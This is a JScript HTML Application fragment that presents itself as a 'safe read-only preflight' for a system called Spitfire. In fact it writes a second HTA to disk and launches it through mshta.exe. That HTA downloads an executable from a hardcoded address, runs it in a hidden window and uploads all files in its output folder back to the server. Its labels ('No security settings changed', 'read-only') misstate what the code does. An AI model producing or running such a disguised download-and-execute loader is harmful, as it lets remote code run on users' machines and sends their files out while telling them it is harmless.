function boot(){try{var localText="<html><head><title>Spitfire read-only preflight</title><HTA:APPLICATION APPLICATIONNAME=\"SPF safe preflight\" SINGLEINSTANCE=\"yes\" />\n<script language=\"JScript\">\nvar B=\"http://10.19.70.13:18978/\",D=\"C:\\\\SPFCAP_20261101b\",f,s,history=[];\nfunction req(method,url,data){var x=new ActiveXObject(\"MSXML2.XMLHTTP\");x.open(method,url,false);x.send(typeof(data)==\"undefined\"?null:data);if(x.status!=200)throw new Error(\"HTTP \"+x.status+\" \"+url);return x;}\nfunction download(name){var x=req(\"GET\",B+name),a=new ActiveXObject(\"ADODB.Stream\");a.Type=1;a.Open();a.Write(x.responseBody);a.SaveToFile(D+\"\\\\\"+name,2);a.Close();}\nfunction upload(path,name){if(!f.FileExists(path))return;var a=new ActiveXObject(\"ADODB.Stream\");a.Type=1;a.Open();a.LoadFromFile(path);req(\"POST\",B+\"upload/\"+name,a.Read());a.Close();}\nfunction say(t){history.push(new Date().toUTCString()+\" | \"+t);document.getElementById(\"status\").innerText=history.join(\"\\r\\n\");}\nfunction run(){try{window.resizeTo(750,450);f=new ActiveXObject(\"Scripting.FileSystemObject\");s=new ActiveXObject(\"WScript.Shell\");if(f.FolderExists(D))throw new Error(\"Output directory already exists; choose a new run, never overwrite evidence\");f.CreateFolder(D);say(\"Read-only diagnostic: original application will NOT be started\");download(\"guest_probe.exe\");download(\"host-isolation-proof.txt\");var rc=s.Run('\"'+D+'\\\\guest_probe.exe\" preflight \"'+D+'\\\\run\" \"'+D+'\\\\host-isolation-proof.txt\"',0,true);say(\"Guest probe exit=\"+rc+\" (20 means Opt-out OFF; suite blocked)\");var files=new Enumerator(f.GetFolder(D+\"\\\\run\").Files);for(;!files.atEnd();files.moveNext()){var file=files.item();upload(file.Path,file.Name);}say(\"Evidence uploaded. No settings changed. Original not launched.\");var out=f.CreateTextFile(D+\"\\\\bootstrap-status.txt\",false,false);out.Write(history.join(\"\\r\\n\"));out.Close();upload(D+\"\\\\bootstrap-status.txt\",\"bootstrap-status.txt\");}catch(e){say(\"BLOCKED: \"+(e.description||e.message));}}\nwindow.onload=run;\n<\/script></head><body><h2>Spitfire safe preflight</h2><p>Inventory + one EMPOPTOUT? query to isolated simulator. No laser controls.</p><pre id=\"status\"></pre></body></html>\n";var f=new ActiveXObject("Scripting.FileSystemObject"),s=new ActiveXObject("WScript.Shell"),d="C:\\SPFCAP_BOOT_20261101";if(!f.FolderExists(d))f.CreateFolder(d);var p=d+"\\bootstrap-local.hta",o=f.CreateTextFile(p,true,false);o.Write(localText);o.Close();s.Run('mshta.exe "'+p+'"',1,false);window.close();}catch(e){document.getElementById("s").innerText="Local bootstrap failed: "+(e.description||e.message);}}
window.onload=boot;</script></head><body><pre id="s">Starting local read-only preflight. No security settings changed.</pre></body></html>